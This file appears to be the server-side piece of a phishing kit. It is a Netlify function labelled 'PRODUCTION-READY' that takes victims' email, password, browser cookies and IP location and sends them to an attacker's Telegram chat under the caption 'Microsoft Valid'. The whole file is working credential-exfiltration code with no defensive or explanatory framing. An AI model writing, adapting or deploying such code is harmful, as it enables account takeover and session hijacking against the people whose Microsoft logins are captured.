/**
 * PRODUCTION-READY: Telegram Bot Function for Netlify
 * Sends credentials + cookies TXT file in ONE single message
 */

const https = require('https');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ✅ Send message with document caption (all in one message)
function sendDocumentWithCaption(fileContent, fileName, caption) {
  return new Promise((resolve, reject) => {
    const base64Content = Buffer.from(fileContent).toString('base64');
    const postData = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      document: `data:text/plain;base64,${base64Content}`,
      caption: caption,
      parse_mode: 'HTML'
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: 15000
    };

    console.log('📤 Sending document with caption...');

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          if (res.statusCode === 200 && response.ok) {
            console.log('✅ Document + caption sent to Telegram');
            resolve(response);
          } else {
            reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
          }
        } catch (e) {
          reject(new Error(`Failed to parse Telegram response: ${e.message}`));
        }
      });
    });

    req.on('error', (error) => {
      console.error(`❌ Telegram error: ${error.message}`);
      reject(error);
    });

    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Telegram request timeout'));
    });

    req.write(postData);
    req.end();
  });
}

function escapeHtml(text) {
  if (!text) return '';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

exports.handler = async (event, context) => {
  console.log('🚀 Starting sendTelegram handler');

  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Accept',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ message: 'OK' })
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    let requestData;
    try {
      requestData = JSON.parse(event.body || '{}');
    } catch (error) {
      console.error('❌ JSON parse error:', error);
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Invalid JSON in request body' })
      };
    }

    const { email, password, cookies = [], locationData = {}, cookieFiles = {} } = requestData;

    console.log('📊 Received data:', {
      email: !!email,
      password: !!password,
      hasCookieFile: !!cookieFiles.jsonFile
    });

    if (!email && !password && cookies.length === 0) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'No meaningful data provided' })
      };
    }

    // ✅ BUILD CAPTION WITH ALL DATA
    let caption = '<b>✅ Microsoft Valid</b>\n\n';

    // Email
    if (email) {
      caption += `👤:- ${escapeHtml(email)}\n`;
    }

    // Password
    if (password) {
      caption += `🔑:- ${escapeHtml(password)}\n`;
    }

    // Location
    if (locationData && locationData.ip) {
      caption += `\n<b>🌍 Location:</b>\n`;
      caption += `IP:- ${escapeHtml(locationData.ip)}\n`;
      if (locationData.city) caption += `City:- ${escapeHtml(locationData.city)}\n`;
      if (locationData.region) caption += `Region:- ${escapeHtml(locationData.region)}\n`;
      if (locationData.country) caption += `Country:- ${escapeHtml(locationData.country)}\n`;
    }

    // Browser
    caption += `\nBrowser:- chrome\n`;

    // Timestamp
    caption += `\n⏰ ${new Date().toISOString()}\n`;

    let documentSent = false;

    // ✅ Send cookies as TXT file with caption (ALL IN ONE MESSAGE)
    if (cookieFiles && cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
      try {
        console.log('📦 Creating TXT file from cookies...');

        // Create simple TXT content (just the cookie JSON)
        const txtContent = cookieFiles.jsonFile.content;

        // Generate filename
        const timestamp = Date.now();
        const fileName = `${email || 'credentials'}_${timestamp}.txt`;

        console.log('📄 Filename:', fileName);
        console.log('📊 TXT file size:', txtContent.length, 'bytes');

        // ✅ Send document with caption (ALL IN ONE MESSAGE)
        await sendDocumentWithCaption(txtContent, fileName, caption);

        documentSent = true;
        console.log('✅ Document + caption sent in ONE message');
      } catch (fileError) {
        console.error('❌ Failed to send document:', fileError.message);
      }
    }

    console.log('═══════════════════════════════════════════');
    console.log('✅ DATA SENT SUCCESSFULLY');
    console.log('═══════════════════════════════════════════');

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'All data transmitted to Telegram successfully',
        timestamp: new Date().toISOString(),
        transmitted: {
          documentWithCaption: documentSent
        }
      })
    };

  } catch (error) {
    console.error('❌ HANDLER ERROR:', error.message);

    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: error.message,
        success: false
      })
    };
  }
};
